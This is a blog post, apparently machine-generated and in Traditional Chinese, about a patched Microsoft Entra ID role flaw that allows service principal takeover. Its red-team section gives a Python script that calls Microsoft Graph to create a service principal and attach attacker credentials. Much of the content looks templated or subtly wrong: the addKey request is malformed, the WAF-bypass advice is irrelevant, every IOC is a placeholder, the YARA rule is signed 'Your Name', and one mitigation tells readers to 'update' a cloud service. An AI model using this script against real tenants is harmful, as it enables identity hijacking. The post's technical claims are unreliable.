---
layout: post
title:  "Microsoft Patches Entra ID Role Flaw That Enabled Service Principal Takeover"
date:   2026-04-28 08:11:58 +0000
categories: [security]
severity: high
---

# 🔥 解析 Microsoft Entra ID 中的特權升級漏洞

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.5)
> * **受駭指標**: 特權升級和身份劫持
> * **關鍵技術**: `Agent ID Administrator` 角色、服務主體（Service Principal）和身份Lifecycle管理

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Microsoft Entra ID 中的 `Agent ID Administrator` 角色沒有正確地限制服務主體的存取權限，導致攻擊者可以升級特權和劫持身份。
* **攻擊流程圖解**:
  1. 攻擊者獲得 `Agent ID Administrator` 角色
  2. 攻擊者使用該角色創建或修改服務主體
  3. 攻擊者將自己的憑證添加到服務主體中
  4. 攻擊者使用服務主體的憑證進行身份驗證和授權
* **受影響元件**: Microsoft Entra ID、Azure AD 和相關的服務主體

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: `Agent ID Administrator` 角色和服務主體的存取權限
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 創建服務主體
    url = "https://graph.microsoft.com/v1.0/servicePrincipals"
    headers = {
        "Authorization": "Bearer <access_token>",
        "Content-Type": "application/json"
    }
    data = {
        "displayName": "example-service-principal",
        "passwordCredentials": [
            {
                "customKeyIdentifier": "example-key",
                "value": "example-password"
            }
        ]
    }
    response = requests.post(url, headers=headers, json=data)
    
    # 將自己的憑證添加到服務主體中
    url = "https://graph.microsoft.com/v1.0/servicePrincipals/<service_principal_id>/addKey"
    headers = {
        "Authorization": "Bearer <access_token>",
        "Content-Type": "application/json"
    }
    data = {
        "customKeyIdentifier": "example-key",
        "value": "example-certificate"
    }
    response = requests.post(url, headers=headers, json=data)
    
    ```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用不同的 HTTP 方法或修改請求頭部

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `<hash_value>` |
| IP | `<ip_address>` |
| Domain | `<domain_name>` |
| File Path | `<file_path>` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Microsoft_Entra_ID_Vulnerability {
        meta:
            description = "Microsoft Entra ID Vulnerability"
            author = "Your Name"
        strings:
            $s1 = "https://graph.microsoft.com/v1.0/servicePrincipals"
            $s2 = "addKey"
        condition:
            all of them
    }
    
    ```
* **緩解措施**: 更新 Microsoft Entra ID 和 Azure AD 至最新版本，並限制 `Agent ID Administrator` 角色的存取權限

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **服務主體 (Service Principal)**: 一種特殊的 Azure AD 帳戶，代表了一個應用程序或服務。
* **Agent ID Administrator**: 一種特殊的 Azure AD 角色，負責管理服務主體的身份 Lifecycle。
* **身份 Lifecycle**: 服務主體的身份管理過程，包括創建、修改和刪除。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/microsoft-patches-entra-id-role-flaw.html)
- [Microsoft Entra ID 文檔](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)
- [Azure AD 文檔](https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-architecture)


